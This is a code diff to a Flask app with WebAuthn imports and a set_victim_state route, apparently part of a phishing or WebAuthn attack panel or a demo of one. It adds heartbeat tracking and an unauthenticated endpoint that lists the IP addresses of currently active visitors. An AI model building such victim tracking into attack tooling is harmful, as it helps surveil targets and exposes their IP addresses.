@@ -18,7 +18,7 @@ from webauthn.helpers.structs import (
     AuthenticationCredential,
 )
 from webauthn.helpers.cose import COSEAlgorithmIdentifier
-from datetime import datetime
+from datetime import datetime, timedelta
 
 app = Flask(__name__, static_folder=None)
 CORS(app)
@@ -596,6 +596,7 @@ def set_victim_state():
 
 IP_LOG_FILE = BASE_DIR / 'visitor_ips.json'
 visitor_ips = []
+active_visitors = {}
 if IP_LOG_FILE.exists():
     try:
         with open(IP_LOG_FILE, 'r') as f:
@@ -606,6 +607,25 @@ if IP_LOG_FILE.exists():
 def save_ips():
     with open(IP_LOG_FILE, 'w') as f:
         json.dump(visitor_ips, f)
+
+@app.route('/api/heartbeat')
+def heartbeat():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip:
+        ip = ip.split(',')[0].strip()
+        active_visitors[ip] = datetime.now().isoformat()
+        return jsonify({'status': 'ok'})
+    return jsonify({'status': 'no_ip'})
+
+@app.route('/api/get-active')
+def get_active():
+    now = datetime.now()
+    active = []
+    cutoff = (now - timedelta(seconds=30)).isoformat()
+    for ip, last_seen in list(active_visitors.items()):
+        if last_seen > cutoff:
+            active.append(ip)
+    return jsonify({'count': len(active), 'visitors': active})
 
 @app.before_request
 def log_visitor_ip():
